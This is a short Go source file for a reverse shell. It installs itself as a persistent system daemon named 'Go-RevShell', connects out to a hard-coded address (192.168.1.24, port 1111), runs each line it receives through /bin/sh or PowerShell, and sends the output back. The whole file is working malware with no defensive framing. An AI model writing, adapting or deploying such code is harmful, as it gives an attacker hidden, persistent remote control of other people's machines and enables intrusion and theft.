package main

import (
	"bufio"
	"log"
	"net"
	"os/exec"
	"runtime"
	"strconv"

	"github.com/takama/daemon"
)

// To-Do :
// - afficher prompt

func main() {
	daemonize()
	reverseShell("192.168.1.24", 1111)
}

func daemonize() {
	service, err := daemon.New("Go-RevShell", "Une tortue sur son dos", daemon.SystemDaemon)
	handleError(err)
	_, err = service.Install()
	handleError(err)
}

func reverseShell(host string, port int) {
	connexion, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
	handleError(err)
	var shell string
	if runtime.GOOS == "windows" {
		shell = "powershell.exe"
	} else {
		shell = "/bin/sh"
	}
	for {
		clientEntry, err := bufio.NewReader(connexion).ReadString('\n')
		handleError(err)
		cmdOutput, err := exec.Command(shell, clientEntry).Output()

		if err != nil {
			connexion.Write([]byte("Unknown command.\n"))
		}
		_, err = connexion.Write(cmdOutput)
		handleError(err)
	}
}

func handleError(err error) {
	if err != nil {
		log.Fatal(err)
	}
}
